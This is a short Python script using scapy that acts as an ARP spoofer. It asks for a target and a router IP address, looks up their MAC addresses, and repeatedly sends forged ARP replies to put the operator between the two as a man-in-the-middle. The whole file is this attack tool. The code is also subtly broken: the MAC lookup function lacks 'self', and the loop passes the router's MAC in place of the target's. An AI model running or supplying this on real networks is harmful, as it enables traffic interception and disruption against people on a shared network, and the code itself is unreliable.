import scapy.all as scapy
import time 
import termcolor

class ConnectToTarget:

	def spoof(self,router_ip,target_ip,router_mac,target_mac ):
		packet1=scapy.ARP(op=2, hwdst=router_mac,pdst=router_ip, psrc=target_ip)
		packet2=scapy.ARP(op=2, hwdst=target_mac,pdst=target_ip, psrc=router_ip)
		scapy.send(packet1)
		scapy.send(packet2)
	def get_mac_address(ip_address):
		broadcast_layer=scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
		arp_layer=scapy.ARP(pdst=ip_address)
		get_mac_packet=broadcast_layer/arp_layer
		answer=scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
		return answer[0][1].hwsrc



	def get_ip_and_route_address(self):
		target_ip= input(termcolor.colored('[+] Target Ip Address:','yellow'))
		router_ip= input(termcolor.colored('[+] Router Ip Address): ','blue'))
		target_mac=self.get_mac_address(target_ip)
		router_mac=self.get_mac_address(router_ip)

		try:
			while True:
				self.spoof(router_ip,target_ip,router_mac,router_mac)
				time.sleep(2)
		except KeyboardInterrupt:
			print("Closing ARP Spoofer")
connectTargetObject=ConnectToTarget()
connectTargetObject.get_ip_and_route_address()